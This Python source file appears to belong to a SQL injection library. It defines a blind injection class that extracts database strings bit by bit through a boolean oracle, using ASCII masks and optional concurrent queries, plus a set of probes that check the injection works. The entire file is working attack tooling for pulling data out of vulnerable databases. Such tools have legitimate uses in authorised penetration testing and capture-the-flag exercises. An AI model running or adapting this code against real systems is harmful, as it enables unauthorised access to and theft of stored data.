from __future__ import annotations
from asyncio import gather
from typing import AsyncGenerator
from sqlinjectlib._sqlinjectlib import InjectorFunction
from sqlinjectlib._unioninject import UnionInjector
from sqlinjectlib._databases import DatabaseType, MySQL
from sqlinjectlib._typedql import SQL
from sqlinjectlib._utils import wrap


class BlindInjector(UnionInjector):
    """Blind SQL injection

    You have a blind SQL injection when you can inject an SQL query that returns a boolean value
    """

    def __init__(
        self,
        injector: InjectorFunction[SQL[bool], bool],
        /,
        *,
        concurrent: bool = False,
        database_type: DatabaseType = MySQL(),
    ):
        """
        - injector: function that given a boolean query returns the result
        - concurrent: if the function can be called multiple times concurrently to speed up
        - database_type: the type of the database you are injecting into
        """
        self.__concurrent = concurrent
        self.__injector = wrap(injector)
        super().__init__(self.__call, database_type=database_type)

    async def __binary_search(self, query: SQL[str], char_index: int) -> int:
        concurrent = [
            self.__injector(
                binary_search_query(self.database_type, query, char_index, i)
            )
            for i in range(8)
        ]
        bits = (
            await gather(*concurrent)
            if self.__concurrent
            else [await c for c in concurrent]
        )
        result = 0
        for i, bit in enumerate(bits):
            result += bit << i
        return result

    async def __call(self, query: SQL[str]) -> str | None:
        result = ""
        while True:
            char = await self.__binary_search(query, len(result))
            if char == 0:
                return result
            if char == 1:
                return None if not result else result
            result += chr(char)

    async def test(self) -> AsyncGenerator[tuple[str, bool], None]:
        yield ("true", await self.__injector(SQL.bool(True)))
        yield ("false", not await self.__injector(SQL.bool(False)))
        yield ("=", await self.__injector(SQL.int(1) @ SQL.int(1)))
        yield ("&", await self.__injector((SQL.int(1) & SQL.int(1)) @ SQL.int(1)))
        yield (
            "coalesce",
            await self.__injector(SQL.coalesce(SQL.bool(True), SQL.bool(False))),
        )
        yield ("as string", await self.__injector(SQL.str(SQL.int(1)) @ SQL.str("1")))
        yield (
            "ascii",
            await self.__injector(
                self.database_type.ascii(SQL.char("a")) @ SQL.int(97)
            ),
        )
        yield ("char at", await self.__injector(SQL.str("lol")[0] @ SQL.char("l")))
        async for elem in super().test():
            yield elem


def binary_search_query(
    database: DatabaseType, query: SQL[str], char_index: int, bit_index: int
) -> SQL[bool]:
    mask = 1 << bit_index
    return (
        SQL.coalesce(database.ascii(query[char_index]), SQL.int(1)) & SQL.int(mask)
    ) @ SQL.int(mask)
